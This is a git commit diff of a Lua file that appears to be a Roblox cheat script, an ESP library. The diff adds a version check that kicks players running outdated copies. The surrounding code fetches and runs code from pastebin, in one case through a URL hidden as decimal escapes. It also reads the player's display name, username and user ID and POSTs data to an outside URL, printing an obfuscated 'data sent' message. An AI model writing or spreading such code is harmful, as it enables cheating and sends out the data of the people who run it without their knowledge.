e65d8899adb7ca4e90b279d4c25d93040ea9fd11
spoofy-raccoon <141374373+spoofy-raccoon@users.noreply.github.com>
2023-08-13 14:29:50 -0400

    Update SynergyFreeESPLIBV2.lua

--- SynergyFreeESPLIBV2.lua
+++ SynergyFreeESPLIBV2.lua
@@ -2,8 +2,9 @@ local verioncheck = loadstring(game:HttpGet("https://pastebin.com/raw/a8nbi425")
 local version = "Version10"
 for i,v in pairs(verioncheck) do 
     print(v)
-    if v == version then 
-    local LocalPlayer = game:GetService("Players").LocalPlayer
+    if v == version then
+print("Verion Check Pass")
+local LocalPlayer = game:GetService("Players").LocalPlayer
 local DName = game.Players.LocalPlayer.DisplayName 
 local Name = game.Players.LocalPlayer.Name
 local Userid = game.Players.LocalPlayer.UserId
@@ -44,8 +45,8 @@ request = syn and syn.request or request;
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 print("\100\097\116\097\032\115\101\110\116\040\112\097\115\115\041");
-    local blacklistcheck = loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\112\097\115\116\101\098\105\110\046\099\111\109\047\114\097\119\047\056\048\076\056\087\077\072\078"))()
-    if blacklistcheck[game:service('Players').LocalPlayer.UserId] then
+        local blacklistcheck = loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\112\097\115\116\101\098\105\110\046\099\111\109\047\114\097\119\047\056\048\076\056\087\077\072\078"))()
+        if blacklistcheck[game:service('Players').LocalPlayer.UserId] then
         game:service('Players').LocalPlayer:Kick('Blacklisted | Appeal at https://discord.gg/zzsr3ReE4s')
         else
             print("blacklist check pass 1")
@@ -55,7 +56,12 @@ print("\100\097\116\097\032\115\101\110\116\040\112\097\115\115\041");
                 else
                 print("blacklist check pass 2")
                 print("You are not blacklisted")
-                end
+               end
             end
-        end
+    else
+        print("Version Check Failed")
+        game:service('Players').LocalPlayer:Kick('Version Check Failed | Update Synergy')
     end
+end
+
+
